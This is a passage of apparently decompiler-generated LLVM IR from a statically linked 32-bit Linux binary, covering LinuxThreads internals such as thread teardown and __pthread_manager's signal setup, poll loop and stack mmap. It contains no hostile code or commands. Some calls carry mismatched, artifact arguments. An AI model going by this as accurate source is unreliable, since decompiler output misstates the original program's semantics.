  %v9_80573d5 = icmp eq i32 %v0_80573d5, 12
  store i1 %v9_80573d5, i1* %zf.global-to-local, align 1
  %v0_80573d8 = load i32, i32* @esi, align 4
  %v1_80573d8 = add i32 %v0_80573d8, 45
  %v2_80573d8 = inttoptr i32 %v1_80573d8 to i8*
  %v3_80573d8 = load i8, i8* %v2_80573d8, align 1
  %v4_80573d8 = sext i8 %v3_80573d8 to i32
  store i32 %v4_80573d8, i32* @ebx, align 4
  %v1_80573dc = add i32 %v0_80573d8, 28
  %v2_80573dc = inttoptr i32 %v1_80573dc to i32*
  %v3_80573dc = load i32, i32* %v2_80573dc, align 4
  %v1_80573df = inttoptr i32 %v3_80573dc to i32*
  %v2_80573df = call i32 @__pthread_unlock(i32* %v1_80573df)
  %v1_80573e7 = icmp eq i8 %v3_80573d8, 0
  store i1 %v1_80573e7, i1* %zf.global-to-local, align 1
  br i1 %v1_80573e7, label %dec_label_pc_80573fa, label %dec_label_pc_80573eb

dec_label_pc_80573eb:                             ; preds = %dec_label_pc_80573d5
  %v0_80573eb = load i32, i32* @esi, align 4
  store i32 %v0_80573eb, i32* @eax, align 4
  %v0_80573ed = call i32 @pthread_free()
  br label %dec_label_pc_80573fa

dec_label_pc_80573f6:                             ; preds = %dec_label_pc_8057381, %dec_label_pc_8057377
  %v0_8057388 = phi i32 [ %v0_8057377, %dec_label_pc_8057377 ], [ %v2_8057384, %dec_label_pc_8057381 ]
  store i32 %v0_8057388, i32* @esi, align 4
  %v12_80573f6 = icmp eq i32 %v0_8057388, %v0_8057377
  %v1_80573f8 = icmp eq i1 %v12_80573f6, false
  br i1 %v1_80573f8, label %dec_label_pc_8057381, label %dec_label_pc_80573fa.loopexit

dec_label_pc_80573fa.loopexit:                    ; preds = %dec_label_pc_80573f6
  store i1 %v12_80573f6, i1* %zf.global-to-local, align 1
  br label %dec_label_pc_80573fa

dec_label_pc_80573fa:                             ; preds = %dec_label_pc_80573fa.loopexit, %dec_label_pc_80573d5, %dec_label_pc_80573eb
  %v0_80573fa = load i32, i32* @global_var_8079b04.573, align 4
  %v1_80573fa = icmp eq i32 %v0_80573fa, 0
  store i1 %v1_80573fa, i1* %zf.global-to-local, align 1
  br i1 %v1_80573fa, label %dec_label_pc_8057415, label %dec_label_pc_8057403

dec_label_pc_8057403:                             ; preds = %dec_label_pc_80573fa
  %v0_8057403 = load i32, i32* bitcast (i32** @global_var_8075300.575 to i32*), align 256
  store i32 %v0_8057403, i32* %edx.global-to-local, align 4
  store i1 true, i1* %zf.global-to-local, align 1
  store i32 %v0_8057403, i32* @eax, align 4
  %v0_8057410 = call i32 @restart()
  br label %dec_label_pc_8057415

dec_label_pc_8057415:                             ; preds = %dec_label_pc_80573fa, %dec_label_pc_8057403
  %v3_8057415 = load i32, i32* %stack_var_-12, align 4
  %v1_805741b = trunc i32 %v3_8057415 to i8
  %v2_805741b = urem i8 %v1_805741b, -128
  %v2_805741d = add nuw i8 %v2_805741b, 1
  %v2_805741d.off = add nuw i8 %v2_805741b, 2
  %tmp = icmp ult i8 %v2_805741d.off, 3
  store i1 %tmp, i1* %zf.global-to-local, align 1
  %tmp21 = icmp slt i8 %v2_805741d, 2
  br i1 %tmp21, label %dec_label_pc_805743e, label %dec_label_pc_8057425

dec_label_pc_8057425:                             ; preds = %dec_label_pc_8057415
  %v1_8057425 = urem i32 %v3_8057415, 128
  %v2_8057425 = icmp eq i32 %v1_8057425, 0
  store i1 %v2_8057425, i1* %zf.global-to-local, align 1
  store i32 %v1_8057425, i32* @ecx, align 4
  store i32 1, i32* @edx, align 4
  store i32 %v1_8057425, i32* @eax, align 4
  %v0_805742f = call i32 @pthread_kill_all_threads()
  %v0_8057434 = load i32, i32* @esp, align 4
  %v9_8057434 = icmp eq i32 %v0_8057434, 12
  store i1 %v9_8057434, i1* %zf.global-to-local, align 1
  %v1_8057439 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_805743e:                             ; preds = %dec_label_pc_8057415, %entry
  %v3_805744b = call i32 @__libc_waitpid(i32 -1, i32 %v2_8057444, i32 -2147483647)
  %v1_8057453 = icmp eq i32 %v3_805744b, 0
  store i1 %v1_8057453, i1* %zf.global-to-local, align 1
  %tmp22 = icmp slt i32 %v3_805744b, 1
  %tmp23 = icmp eq i1 %tmp22, false
  br i1 %tmp23, label %dec_label_pc_8057377, label %dec_label_pc_805745b

dec_label_pc_805745b:                             ; preds = %dec_label_pc_805743e
  store i1 false, i1* %zf.global-to-local, align 1
  %v2_805745e = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_805745e, i32* @ebx, align 4
  store i32 %v0_805736d, i32* @esi, align 4
  ret i32 %v3_805744b

; uselistorder directives
  uselistorder i32 %v3_805744b, { 0, 2, 3, 1 }
  uselistorder i32 %v1_8057425, { 2, 1, 0 }
  uselistorder i1 %v12_80573f6, { 1, 0 }
  uselistorder i32 %v0_8057388, { 0, 4, 3, 2, 1 }
  uselistorder i32 %v0_80573c4, { 1, 0 }
  uselistorder i1 %v4_80573b5, { 1, 0 }
  uselistorder i32 %v2_8057384, { 1, 0, 2 }
  uselistorder i32* %stack_var_-8, { 1, 0, 2 }
  uselistorder i1* %zf.global-to-local, { 1, 13, 2, 3, 4, 5, 6, 0, 7, 8, 9, 10, 11, 12, 14 }
  uselistorder label %dec_label_pc_8057415, { 1, 0 }
  uselistorder label %dec_label_pc_80573fa, { 0, 2, 1 }
  uselistorder label %dec_label_pc_80573d5, { 2, 0, 1 }
}

define i32 @__pthread_manager(i32 %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-300 = alloca i32, align 4
  %stack_var_-364 = alloca i32, align 4
  %stack_var_-152 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_8057461 = load i32, i32* @ebp, align 4
  %v0_8057462 = load i32, i32* @edi, align 4
  %v0_8057463 = load i32, i32* @esi, align 4
  %v0_8057464 = load i32, i32* @ebx, align 4
  store i32 %v0_8057464, i32* %stack_var_-16, align 4
  %v2_805746b = ptrtoint i32* %stack_var_-152 to i32
  store i32 %v2_805746b, i32* @ebx, align 4
  store i32 %v2_805746b, i32* %stack_var_-364, align 4
  store i32 ptrtoint (i32* @global_var_8075168.582 to i32), i32* bitcast (i32** @global_var_8075164.583 to i32*), align 4
  store i32 ptrtoint (i32* @global_var_8075170.585 to i32), i32* @global_var_807516c.584, align 4
  %v1_8057487 = call i32 @sigfillset(i32 %v2_805746b)
  store i32 %v1_8057487, i32* %eax.global-to-local, align 4
  %v0_805748e = load i32, i32* @global_var_807530c.586, align 4
  store i32 %v2_805746b, i32* %stack_var_-364, align 4
  %v1_8057495 = call i32 @__GI_sigdelset(i32 %v2_805746b)
  store i32 %v1_8057495, i32* %eax.global-to-local, align 4
  store i32 %v2_805746b, i32* %ecx.global-to-local, align 4
  store i32 %v0_805748e, i32* @esi, align 4
  store i32 %v2_805746b, i32* %stack_var_-364, align 4
  %v1_805749f = call i32 @__GI_sigdelset(i32 %v2_805746b)
  %v0_80574a4 = load i32, i32* @global_var_807f368.576, align 8
  store i32 %v0_80574a4, i32* %eax.global-to-local, align 4
  %v1_80574ac = icmp eq i32 %v0_80574a4, 0
  br i1 %v1_80574ac, label %dec_label_pc_80574c5, label %dec_label_pc_80574b0

dec_label_pc_80574b0:                             ; preds = %entry
  %v0_80574b0 = load i32, i32* @global_var_8075310.577, align 16
  store i32 %v0_80574b0, i32* %eax.global-to-local, align 4
  %tmp48 = icmp slt i32 %v0_80574b0, 1
  br i1 %tmp48, label %dec_label_pc_80574c5, label %dec_label_pc_80574b9

dec_label_pc_80574b9:                             ; preds = %dec_label_pc_80574b0
  store i32 %v2_805746b, i32* %stack_var_-364, align 4
  %v1_80574bd = call i32 @__GI_sigdelset(i32 %v2_805746b)
  store i32 %v1_80574bd, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80574c5

dec_label_pc_80574c5:                             ; preds = %dec_label_pc_80574b0, %entry, %dec_label_pc_80574b9
  store i32 %v2_805746b, i32* %eax.global-to-local, align 4
  store i32 2, i32* %stack_var_-364, align 4
  %v3_80574d2 = bitcast i32* %stack_var_-152 to %_TYPEDEF_sigset_t*
  %v4_80574d2 = call i32 @__GI_sigprocmask(i32 2, %_TYPEDEF_sigset_t* %v3_80574d2, i32 0)
  %v0_80574d7 = load i32, i32* bitcast (i32** @global_var_8075300.575 to i32*), align 256
  store i32 %v0_80574d7, i32* %eax.global-to-local, align 4
  store i32 2, i32* @edi, align 4
  %v3_80574dd = load i32, i32* @global_var_8075318.587, align 4
  store i32 %v3_80574dd, i32* %stack_var_-364, align 4
  %v1_80574e0 = call i32 @__pthread_manager_adjust_prio(i32 %v3_80574dd)
  store i32 %v1_80574e0, i32* %eax.global-to-local, align 4
  %v2_80574ee = ptrtoint i32* %stack_var_-300 to i32
  br label %dec_label_pc_80574e8

dec_label_pc_80574e8:                             ; preds = %dec_label_pc_8057505, %dec_label_pc_80574c5
  store i32 %v2_80574ee, i32* %eax.global-to-local, align 4
  store i32 %arg1, i32* %stack_var_-364, align 4
  %v3_80574fa = call i32 @__libc_read(i32 %arg1, i32 %v2_80574ee, i32 148)
  %v1_8057502 = add i32 %v3_80574fa, 1
  %v8_8057502 = icmp eq i32 %v1_8057502, 0
  store i32 %v1_8057502, i32* %eax.global-to-local, align 4
  %v1_8057503 = icmp eq i1 %v8_8057502, false
  br i1 %v1_8057503, label %dec_label_pc_805750f, label %dec_label_pc_8057505

dec_label_pc_8057505:                             ; preds = %dec_label_pc_80574e8
  %v0_8057505 = load i32, i32* %stack_var_-364, align 4
  %v1_8057505 = call i32 @__errno_location(i32 %v0_8057505)
  store i32 %v1_8057505, i32* %eax.global-to-local, align 4
  %v1_805750a = inttoptr i32 %v1_8057505 to i32*
  %v2_805750a = load i32, i32* %v1_805750a, align 4
  %v11_805750a = icmp eq i32 %v2_805750a, 4
  br i1 %v11_805750a, label %dec_label_pc_80574e8, label %dec_label_pc_805750f

dec_label_pc_805750f:                             ; preds = %dec_label_pc_8057505, %dec_label_pc_80574e8
  store i32 %arg1, i32* %edx.global-to-local, align 4
  %v4_8057537 = inttoptr i32 %arg1 to %pollfd*
  %v1_80579f3 = inttoptr i32 %arg1 to i32*
  %v4_8057717 = inttoptr i32 %arg1 to i8*
  %v4_805783a = inttoptr i32 %arg1 to i16*
  br label %dec_label_pc_8057527thread-pre-split

dec_label_pc_8057527thread-pre-split:             ; preds = %dec_label_pc_8057a7f, %dec_label_pc_8057571, %dec_label_pc_8057574, %dec_label_pc_805750f
  %v1_8057527.pr = load i32, i32* @esp, align 4
  br label %dec_label_pc_8057527

dec_label_pc_8057527:                             ; preds = %dec_label_pc_805757e, %dec_label_pc_8057aba, %dec_label_pc_8057527thread-pre-split
  %v1_8057527 = phi i32 [ %v1_8057527.pr, %dec_label_pc_8057527thread-pre-split ], [ %v1_8057595, %dec_label_pc_805757e ], [ %v1_8057aba, %dec_label_pc_8057aba ]
  %v0_8057527 = load i32, i32* @ebx, align 4
  %v2_8057527 = add i32 %v1_8057527, -4
  %v3_8057527 = inttoptr i32 %v2_8057527 to i32*
  store i32 %v0_8057527, i32* %v3_8057527, align 4
  %v1_8057528 = add i32 %v1_8057527, -8
  %v2_8057528 = inttoptr i32 %v1_8057528 to i32*
  store i32 2000, i32* %v2_8057528, align 4
  %v1_805752d = add i32 %v1_8057527, -12
  %v2_805752d = inttoptr i32 %v1_805752d to i32*
  store i32 1, i32* %v2_805752d, align 4
  %v1_805752f = add i32 %v1_8057527, 324
  store i32 %v1_805752f, i32* %eax.global-to-local, align 4
  %v2_8057536 = add i32 %v1_8057527, -16
  %v3_8057536 = inttoptr i32 %v2_8057536 to i32*
  store i32 %v1_805752f, i32* %v3_8057536, align 4
  %v2_8057537 = load i32, i32* %stack_var_-16, align 4
  %v5_8057537 = call i32 @__libc_poll(%pollfd* %v4_8057537, i32 1, i32 %v2_8057537)
  store i32 %v5_8057537, i32* %eax.global-to-local, align 4
  store i32 %v5_8057537, i32* @ebx, align 4
  %v1_805753e = call i32 @getppid(i32 %arg1)
  store i32 %v1_805753e, i32* %eax.global-to-local, align 4
  %v9_8057546 = icmp eq i32 %v1_805753e, 1
  %v1_8057549 = icmp eq i1 %v9_8057546, false
  br i1 %v1_8057549, label %dec_label_pc_8057559, label %dec_label_pc_805754b

dec_label_pc_805754b:                             ; preds = %dec_label_pc_8057527
  store i32 0, i32* @edx, align 4
  %v1_805754d = and i32 %v1_805753e, -256
  %v2_805754d = or i32 %v1_805754d, 9
  store i32 %v2_805754d, i32* @eax, align 4
  %v0_805754f = call i32 @pthread_kill_all_threads()
  br label %dec_label_pc_8057a55

dec_label_pc_8057559:                             ; preds = %dec_label_pc_8057527
  %v0_8057559 = load i32, i32* @global_var_8079b00.572, align 256
  store i32 %v0_8057559, i32* %eax.global-to-local, align 4
  %v1_805755e = icmp eq i32 %v0_8057559, 0
  br i1 %v1_805755e, label %dec_label_pc_8057571, label %dec_label_pc_8057562

dec_label_pc_8057562:                             ; preds = %dec_label_pc_8057559
  store i32 0, i32* @global_var_8079b00.572, align 256
  %v0_805756c = call i32 @pthread_reap_children()
  store i32 %v0_805756c, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8057571

dec_label_pc_8057571:                             ; preds = %dec_label_pc_8057559, %dec_label_pc_8057562
  %v0_8057571 = load i32, i32* @ebx, align 4
  %v1_8057571 = add i32 %v0_8057571, -1
  %v8_8057571 = icmp eq i32 %v1_8057571, 0
  store i32 %v1_8057571, i32* @ebx, align 4
  %v1_8057572 = icmp eq i1 %v8_8057571, false
  br i1 %v1_8057572, label %dec_label_pc_8057527thread-pre-split, label %dec_label_pc_8057574

dec_label_pc_8057574:                             ; preds = %dec_label_pc_8057571
  %v0_8057574 = load i32, i32* @esp, align 4
  %v1_8057574 = add i32 %v0_8057574, 330
  %v2_8057574 = inttoptr i32 %v1_8057574 to i8*
  %v3_8057574 = load i8, i8* %v2_8057574, align 1
  %v4_8057574 = urem i8 %v3_8057574, 2
  %v5_8057574 = icmp eq i8 %v4_8057574, 0
  br i1 %v5_8057574, label %dec_label_pc_8057527thread-pre-split, label %dec_label_pc_805757e

dec_label_pc_805757e:                             ; preds = %dec_label_pc_8057574
  %v0_805757e = load i32, i32* @ecx, align 4
  %v2_805757e = add i32 %v0_8057574, -4
  %v3_805757e = inttoptr i32 %v2_805757e to i32*
  store i32 %v0_805757e, i32* %v3_805757e, align 4
  %v1_805757f = add i32 %v0_8057574, -8
  %v2_805757f = inttoptr i32 %v1_805757f to i32*
  store i32 148, i32* %v2_805757f, align 4
  %v1_8057584 = add i32 %v0_8057574, 48
  store i32 %v1_8057584, i32* %ecx.global-to-local, align 4
  %v2_8057588 = add i32 %v0_8057574, -12
  %v3_8057588 = inttoptr i32 %v2_8057588 to i32*
  store i32 %v1_8057584, i32* %v3_8057588, align 4
  %v1_8057589 = add i32 %v0_8057574, 352
  %v2_8057589 = inttoptr i32 %v1_8057589 to i32*
  %v3_8057589 = load i32, i32* %v2_8057589, align 4
  %v5_8057589 = add i32 %v0_8057574, -16
  %v6_8057589 = inttoptr i32 %v5_8057589 to i32*
  store i32 %v3_8057589, i32* %v6_8057589, align 4
  %v2_8057590 = load i32, i32* %stack_var_-16, align 4
  %v4_8057590 = call i32 @__libc_read(i32 %arg1, i32 1, i32 %v2_8057590)
  store i32 %v4_8057590, i32* %eax.global-to-local, align 4
  %v0_8057595 = load i32, i32* @esp, align 4
  %v1_8057595 = add i32 %v0_8057595, 16
  %v1_8057598 = add i32 %v0_8057595, 68
  %v2_8057598 = inttoptr i32 %v1_8057598 to i32*
  %v3_8057598 = load i32, i32* %v2_8057598, align 4
  store i32 %v3_8057598, i32* %eax.global-to-local, align 4
  switch i32 %v1_8057527, label %dec_label_pc_8057527 [
    i32 0, label %dec_label_pc_80575aa
    i32 1, label %dec_label_pc_80579a7
    i32 2, label %dec_label_pc_80579fd
    i32 3, label %dec_label_pc_8057a5f
    i32 4, label %dec_label_pc_8057a89
  ]

dec_label_pc_80575aa:                             ; preds = %dec_label_pc_805757e
  %v1_80575aa = add i32 %v0_8057595, 64
  %v2_80575aa = inttoptr i32 %v1_80575aa to i32*
  %v3_80575aa = load i32, i32* %v2_80575aa, align 4
  store i32 %v3_80575aa, i32* %eax.global-to-local, align 4
  %v1_80575ae = add i32 %v0_8057595, 72
  %v2_80575ae = inttoptr i32 %v1_80575ae to i32*
  %v3_80575ae = load i32, i32* %v2_80575ae, align 4
  store i32 %v3_80575ae, i32* @edi, align 4
  %v2_80575b2 = add i32 %v0_8057595, 20
  %v3_80575b2 = inttoptr i32 %v2_80575b2 to i32*
  store i32 %v3_80575aa, i32* %v3_80575b2, align 4
  %v0_80575b6 = load i32, i32* %eax.global-to-local, align 4
  %v1_80575b6 = add i32 %v0_80575b6, 412
  %v2_80575b6 = inttoptr i32 %v1_80575b6 to i32*
  %v3_80575b6 = load i32, i32* %v2_80575b6, align 4
  store i32 %v3_80575b6, i32* %edx.global-to-local, align 4
  %v1_80575bc = load i32, i32* @esp, align 4
  %v2_80575bc = add i32 %v1_80575bc, 24
  %v3_80575bc = inttoptr i32 %v2_80575bc to i32*
  store i32 %v3_80575b6, i32* %v3_80575bc, align 4
  %v0_80575c0 = load i32, i32* @esp, align 4
  %v1_80575c0 = add i32 %v0_80575c0, 60
  %v2_80575c0 = inttoptr i32 %v1_80575c0 to i32*
  %v3_80575c0 = load i32, i32* %v2_80575c0, align 4
  store i32 %v3_80575c0, i32* %edx.global-to-local, align 4
  %v0_80575c4 = load i32, i32* %eax.global-to-local, align 4
  %v1_80575c4 = add i32 %v0_80575c4, 20
  %v2_80575c4 = inttoptr i32 %v1_80575c4 to i32*
  %v3_80575c4 = load i32, i32* %v2_80575c4, align 4
  store i32 %v3_80575c4, i32* %ecx.global-to-local, align 4
  %v1_80575c7 = add i32 %v0_80575c0, 64
  %v2_80575c7 = inttoptr i32 %v1_80575c7 to i32*
  %v3_80575c7 = load i32, i32* %v2_80575c7, align 4
  store i32 %v3_80575c7, i32* %eax.global-to-local, align 4
  %v2_80575cb = add i32 %v0_80575c0, 36
  %v3_80575cb = inttoptr i32 %v2_80575cb to i32*
  store i32 %v3_80575c0, i32* %v3_80575cb, align 4
  %v0_80575cf = load i32, i32* %ecx.global-to-local, align 4
  %v1_80575cf = load i32, i32* @esp, align 4
  %v2_80575cf = add i32 %v1_80575cf, 28
  %v3_80575cf = inttoptr i32 %v2_80575cf to i32*
  store i32 %v0_80575cf, i32* %v3_80575cf, align 4
  %v0_80575d3 = load i32, i32* %eax.global-to-local, align 4
  %v1_80575d3 = load i32, i32* @esp, align 4
  %v2_80575d3 = add i32 %v1_80575d3, 32
  %v3_80575d3 = inttoptr i32 %v2_80575d3 to i32*
  store i32 %v0_80575d3, i32* %v3_80575d3, align 4
  %v1_80575d7 = call i32 @__GI_getpagesize(i32 %arg1)
  store i32 %v1_80575d7, i32* %eax.global-to-local, align 4
  %v0_80575dc = load i32, i32* @edi, align 4
  %v1_80575dc = icmp eq i32 %v0_80575dc, 0
  store i32 %v1_80575d7, i32* @ebp, align 4
  br i1 %v1_80575dc, label %dec_label_pc_80575fa, label %dec_label_pc_80575e2

dec_label_pc_80575e2:                             ; preds = %dec_label_pc_80575aa
  %v1_80575e2 = add i32 %v0_80575dc, 4
  %v2_80575e2 = inttoptr i32 %v1_80575e2 to i32*
  %v3_80575e2 = load i32, i32* %v2_80575e2, align 4
  %v4_80575e2 = icmp eq i32 %v3_80575e2, 0
  br i1 %v4_80575e2, label %dec_label_pc_80575fa, label %dec_label_pc_80575e8

dec_label_pc_80575e8:                             ; preds = %dec_label_pc_80575e2
  %v0_80575e8 = call i32 @geteuid()
  store i32 %v0_80575e8, i32* %eax.global-to-local, align 4
  store i32 1, i32* @edx, align 4
  %v1_80575f2 = icmp eq i32 %v0_80575e8, 0
  %v1_80575f4 = icmp eq i1 %v1_80575f2, false
  br i1 %v1_80575f4, label %dec_label_pc_8057997, label %dec_label_pc_80575fa

dec_label_pc_80575fa:                             ; preds = %dec_label_pc_80575e8, %dec_label_pc_80575e2, %dec_label_pc_80575aa
  %v0_80575fa = load i32, i32* @esp, align 4
  %v1_80575fa = add i32 %v0_80575fa, 20
  %v2_80575fa = inttoptr i32 %v1_80575fa to i32*
  store i32 2, i32* %v2_80575fa, align 4
  %v0_805760283 = load i32, i32* @esp, align 4
  %v1_805760284 = add i32 %v0_805760283, 20
  %v2_805760285 = inttoptr i32 %v1_805760284 to i32*
  %v3_805760286 = load i32, i32* %v2_805760285, align 4
  %tmp = icmp ult i32 %v3_805760286, 1024
  br i1 %tmp, label %dec_label_pc_8057610, label %dec_label_pc_8057980

dec_label_pc_8057610:                             ; preds = %dec_label_pc_80575fa, %dec_label_pc_8057703
  %v3_805760296 = phi i32 [ %v3_8057602, %dec_label_pc_8057703 ], [ %v3_805760286, %dec_label_pc_80575fa ]
  %v0_805760295 = phi i32 [ %v0_8057602, %dec_label_pc_8057703 ], [ %v0_805760283, %dec_label_pc_80575fa ]
  %v2_8057614 = mul i32 %v3_805760296, 16
  store i32 %v2_8057614, i32* %eax.global-to-local, align 4
  %v1_8057617 = add i32 %v2_8057614, 134680360
  %v2_8057617 = inttoptr i32 %v1_8057617 to i32*
  %v3_8057617 = load i32, i32* %v2_8057617, align 8
  %v4_8057617 = icmp eq i32 %v3_8057617, 0
  %v1_805761e = icmp eq i1 %v4_8057617, false
  br i1 %v1_805761e, label %dec_label_pc_8057703, label %dec_label_pc_8057624

dec_label_pc_8057624:                             ; preds = %dec_label_pc_8057610
  %v0_8057624 = load i32, i32* @edi, align 4
  %v1_8057624 = icmp eq i32 %v0_8057624, 0
  %v0_8057626 = load i32, i32* @global_var_8079c4c.565, align 4
  store i32 %v0_8057626, i32* %ecx.global-to-local, align 4
  br i1 %v1_8057624, label %dec_label_pc_8057656, label %dec_label_pc_805762e

dec_label_pc_805762e:                             ; preds = %dec_label_pc_8057624
  %v1_805762e = add i32 %v0_8057624, 24
  %v2_805762e = inttoptr i32 %v1_805762e to i32*
  %v3_805762e = load i32, i32* %v2_805762e, align 4
  %v4_805762e = icmp eq i32 %v3_805762e, 0
  br i1 %v4_805762e, label %dec_label_pc_8057656, label %dec_label_pc_8057634

dec_label_pc_8057634:                             ; preds = %dec_label_pc_805762e
  %v1_8057634 = add i32 %v0_8057624, 28
  %v2_8057634 = inttoptr i32 %v1_8057634 to i32*
  %v3_8057634 = load i32, i32* %v2_8057634, align 4
  store i32 %v3_8057634, i32* %edx.global-to-local, align 4
  store i32 %v3_8057634, i32* %eax.global-to-local, align 4
  %v2_805763b = add i32 %v0_8057624, 32
  %v3_805763b = inttoptr i32 %v2_805763b to i32*
  %v4_805763b = load i32, i32* %v3_805763b, align 4
  %v5_805763b = sub i32 %v3_8057634, %v4_805763b
  store i32 %v5_805763b, i32* @ebp, align 4
  %v1_805763e = and i32 %v3_8057634, -4
  store i32 %v1_805763e, i32* %eax.global-to-local, align 4
  %v1_8057641 = add i32 %v1_805763e, -480
  store i32 %v1_8057641, i32* @esi, align 4
  store i32 1, i32* @global_var_807f358.569, align 8
  br label %dec_label_pc_80576f1

dec_label_pc_8057656:                             ; preds = %dec_label_pc_805762e, %dec_label_pc_8057624
  %v1_8057656 = add i32 %v0_805760295, 40
  %v2_8057656 = inttoptr i32 %v1_8057656 to i32*
  store i32 2097152, i32* %v2_8057656, align 4
  %v0_805765e = load i32, i32* @esp, align 4
  %v1_805765e = add i32 %v0_805765e, 40
  %v2_805765e = inttoptr i32 %v1_805765e to i32*
  %v3_805765e = load i32, i32* %v2_805765e, align 4
  %v4_805765e = load i32, i32* @ebp, align 4
  %v5_805765e = sub i32 %v3_805765e, %v4_805765e
  store i32 %v5_805765e, i32* %v2_805765e, align 4
  %v0_8057662 = load i32, i32* @edi, align 4
  %v1_8057662 = icmp eq i32 %v0_8057662, 0
  br i1 %v1_8057662, label %dec_label_pc_8057656.dec_label_pc_805767b_crit_edge, label %dec_label_pc_8057666

dec_label_pc_8057656.dec_label_pc_805767b_crit_edge: ; preds = %dec_label_pc_8057656
  %v0_805767b.pre = load i32, i32* @esp, align 4
  %v0_8057687.pre.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_805767b

dec_label_pc_8057666:                             ; preds = %dec_label_pc_8057656
  %v0_8057666 = load i32, i32* @ebp, align 4
  store i32 %v0_8057666, i32* %eax.global-to-local, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  %v2_805766a = add i32 %v0_8057662, 32
  %v3_805766a = inttoptr i32 %v2_805766a to i32*
  %v4_805766a = load i32, i32* %v3_805766a, align 4
  %v5_805766a = add i32 %v0_8057666, -1
  %v1_805766d = add i32 %v5_805766a, %v4_805766a
  %tmp49 = urem i32 %v1_805766d, %v0_8057666
  store i32 %tmp49, i32* @edx, align 4
  %v4_8057670 = sub i32 %v1_805766d, %tmp49
  store i32 %v4_8057670, i32* %eax.global-to-local, align 4
  %v0_8057673 = load i32, i32* @esp, align 4
  %v1_8057673 = add i32 %v0_8057673, 40
  %v2_8057673 = inttoptr i32 %v1_8057673 to i32*
  %v3_8057673 = load i32, i32* %v2_8057673, align 4
  %v10_8057673 = icmp ult i32 %v3_8057673, %v4_8057670
  store i32 %v4_8057670, i32* @ebx, align 4
  %v1_8057679 = icmp eq i1 %v10_8057673, false
  br i1 %v1_8057679, label %dec_label_pc_805767f, label %dec_label_pc_805767b

dec_label_pc_805767b:                             ; preds = %dec_label_pc_8057656.dec_label_pc_805767b_crit_edge, %dec_label_pc_8057666
  %v0_8057687.pre = phi i32 [ %v0_8057687.pre.pre, %dec_label_pc_8057656.dec_label_pc_805767b_crit_edge ], [ %tmp49, %dec_label_pc_8057666 ]
  %v0_805767b = phi i32 [ %v0_805767b.pre, %dec_label_pc_8057656.dec_label_pc_805767b_crit_edge ], [ %v0_8057673, %dec_label_pc_8057666 ]
  %v1_805767b = add i32 %v0_805767b, 40
  %v2_805767b = inttoptr i32 %v1_805767b to i32*
  %v3_805767b = load i32, i32* %v2_805767b, align 4
  store i32 %v3_805767b, i32* @ebx, align 4
  br label %dec_label_pc_805767f

dec_label_pc_805767f:                             ; preds = %dec_label_pc_8057666, %dec_label_pc_805767b
  %v0_8057687 = phi i32 [ %tmp49, %dec_label_pc_8057666 ], [ %v0_8057687.pre, %dec_label_pc_805767b ]
  %v1_8057687 = phi i32 [ %v0_8057673, %dec_label_pc_8057666 ], [ %v0_805767b, %dec_label_pc_805767b ]
  %v2_805767f = add i32 %v1_8057687, 20
  %v3_805767f = inttoptr i32 %v2_805767f to i32*
  %v4_805767f = load i32, i32* %v3_805767f, align 4
  %v6_805767f = mul i32 %v4_805767f, -2097152
  store i32 %v6_805767f, i32* %eax.global-to-local, align 4
  %v2_8057687 = add i32 %v1_8057687, -4
  %v3_8057687 = inttoptr i32 %v2_8057687 to i32*
  store i32 %v0_8057687, i32* %v3_8057687, align 4
  %v0_8057688 = load i32, i32* @edx, align 4
  %v2_8057688 = add i32 %v1_8057687, -8
  %v3_8057688 = inttoptr i32 %v2_8057688 to i32*
  store i32 %v0_8057688, i32* %v3_8057688, align 4
  %v1_8057689 = add i32 %v1_8057687, -12
  %v2_8057689 = inttoptr i32 %v1_8057689 to i32*
  store i32 0, i32* %v2_8057689, align 4
  %v0_805768b = load i32, i32* %ecx.global-to-local, align 4
  %v1_805768b = load i32, i32* %eax.global-to-local, align 4
  %v2_805768b = add i32 %v0_805768b, 2096672
  %v3_805768b = add i32 %v2_805768b, %v1_805768b
  store i32 %v3_805768b, i32* @esi, align 4
  %v0_8057692 = load i32, i32* @global_var_807df14.588, align 4
  store i32 %v0_8057692, i32* %eax.global-to-local, align 4
  %v1_8057697 = add i32 %v1_8057687, -16
  %v2_8057697 = inttoptr i32 %v1_8057697 to i32*
  store i32 -1, i32* %v2_8057697, align 4
  %v0_8057699 = load i32, i32* @esi, align 4
  store i32 %v0_8057699, i32* %ecx.global-to-local, align 4
  %v1_805769b = add i32 %v1_8057687, -20
  %v2_805769b = inttoptr i32 %v1_805769b to i32*
  store i32 306, i32* %v2_805769b, align 4
  %v1_80576a0 = add i32 %v1_8057687, -24
  %v2_80576a0 = inttoptr i32 %v1_80576a0 to i32*
  store i32 7, i32* %v2_80576a0, align 4
  %v0_80576a2 = load i32, i32* %eax.global-to-local, align 4
  %v2_80576a2 = mul i32 %v0_80576a2, 4
  %v0_80576a5 = load i32, i32* %ecx.global-to-local, align 4
  %v2_80576a5 = sub i32 %v0_80576a5, %v2_80576a2
  store i32 %v2_80576a5, i32* %ecx.global-to-local, align 4
  %v2_80576a7 = add i32 %v1_8057687, -28
  %v3_80576a7 = inttoptr i32 %v2_80576a7 to i32*
  store i32 %v2_80576a2, i32* %v3_80576a7, align 4
  %v0_80576a8 = load i32, i32* %ecx.global-to-local, align 4
  %v1_80576aa = add i32 %v0_80576a8, 480
  store i32 %v1_80576aa, i32* %eax.global-to-local, align 4
  %v2_80576af = add i32 %v1_8057687, -32
  %v3_80576af = inttoptr i32 %v2_80576af to i32*
  store i32 %v1_80576aa, i32* %v3_80576af, align 4
  %v2_80576b0 = load i32, i32* %stack_var_-16, align 4
  %v9_80576b0 = call i32 @mmap(i32 %arg1, i32 1, i32 %v2_80576b0, i32 %v0_8057463, i32 %v0_8057462, i32 %v0_8057461, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_80576b5 = load i32, i32* @esp, align 4
  %v1_80576b5 = add i32 %v0_80576b5, 32
  %v1_80576b8 = add i32 %v9_80576b0, 1
